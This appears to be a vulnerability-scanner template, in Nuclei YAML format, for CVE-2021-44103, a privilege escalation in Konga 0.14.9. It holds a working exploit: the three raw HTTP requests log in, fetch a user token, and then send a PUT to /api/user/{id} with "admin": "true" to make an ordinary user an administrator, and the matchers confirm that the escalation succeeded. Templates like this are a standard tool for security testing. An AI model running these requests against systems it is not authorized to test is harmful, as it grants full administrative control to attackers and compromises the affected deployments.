id: CVE-2021-44103
info:
  author: rschio
  classification:
    cve-id: CVE-2021-44103
    cvss-score: 8.7
    cwe-id: CWE-264
  description: Vertical Privilege Escalation in KONGA 0.14.9 allows attackers to higher
    privilege users to full administration access. The attack vector is a crafted
    condition, as demonstrated by the /api/user/{ID} at ADMIN parameter.
  name: KOGA 0.14.9 - Privilege Escalation
  reference:
  - http://n0hat.blogspot.com/2021/11/konga-0149-privilege-escalation-exploit.html
  - https://www.exploit-db.com/exploits/50521
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44103
  severity: high
  tags: cve,cve2021,konga,authenticated
requests:
- extractors:
  - group: 1
    internal: true
    name: id
    part: body
    regex:
    - '"id":([0-9]+)'
    type: regex
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - '"token":"(.*)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_2, "\"admin\":false")
    - contains(body_3, "\"admin\":true")
    type: dsl
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"password": "{{password}}", "identifier": "{{username}}"}

    '
  - 'POST /api/user/{{id}} HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}

    Content-Type: application/json;charset=utf-8


    {"token": "{{token}}"}

    '
  - 'PUT /api/user/{{id}} HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}

    Content-Type: application/json;charset=utf-8


    {"admin": "true", "passports": {"password": "{{password}}", "protocol": "local"},
    "token": "{{token}}", "password_confirmation": "{{password}}"}

    '
  req-condition: true
